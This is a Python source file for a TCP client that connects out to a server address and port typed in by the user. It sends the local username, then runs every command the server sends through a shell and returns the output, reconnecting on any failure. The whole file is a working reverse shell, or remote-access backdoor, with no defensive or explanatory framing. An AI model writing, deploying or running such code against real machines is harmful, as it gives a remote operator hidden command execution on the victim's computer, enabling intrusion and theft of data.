import socket, getpass, subprocess, os


class Client:
    def __init__(self, ip: str, port: int):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creation of the TCP socket
        self.ip = ip
        self.port = port
        self.connect()

    def connect(self):
        try:
            self.client_socket.connect((self.ip, self.port))
            self.client_socket.send(f'MACHINE NAME,{getpass.getuser()}'.encode('utf-8'))
            self.recive_data()
        except:
            self.__init__(ip=self.ip, port=self.port)

    def recive_data(self):
       try:
        while True:
            data = self.client_socket.recv(1024).decode('utf-8', 'ignore')
            self.command(data=data)
       except:
           self.__init__(ip=self.ip, port=self.port)

    def command(self, data: str):  # Basically, insert the data, and if there's no special command like cd or tasklist, interpret's like an cmd command
        data = data
        list_command = list(data.split())
        if list_command[0].lower() == 'cd' and len(list_command) > 1:
            try:
                del list_command[0]
                path = ' '.join(list_command)
                os.chdir(path=path)
                self.client_socket.send(os.getcwd().encode() + '\n'.encode())
            except:
                self.client_socket.send(f'The path: "{path}" was not found \n'.encode())
        elif list_command[0].lower() == 'tasklist':
            self.client_socket.send(str(os.popen("tasklist").read()).encode('utf-8'))
        else:
            self.terminal(data)

    def terminal(self, data):  # Basically, possibility the usage of terminal on the machine
        shell = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stderr = shell.stderr.read().decode('utf-8', 'ignore')
        stdout = shell.stdout.read().decode('utf-8', 'ignore')
        self.client_socket.send((stderr + '\n' + stdout).encode())


def main(ip, port):
    if ip == '':
        ip = '127.0.0.1'
    try:
        client = Client(ip, port)
    except socket.gaierror:
        print('IP ADRESS NOT VALID!')


if __name__ == '__main__':
    try:
        ip = input('Type your ip adress: ').lstrip()
        port = int(input('Type your port: '))
        main(ip, port)
    except ValueError:
        port = 999
        main(ip, port)
        

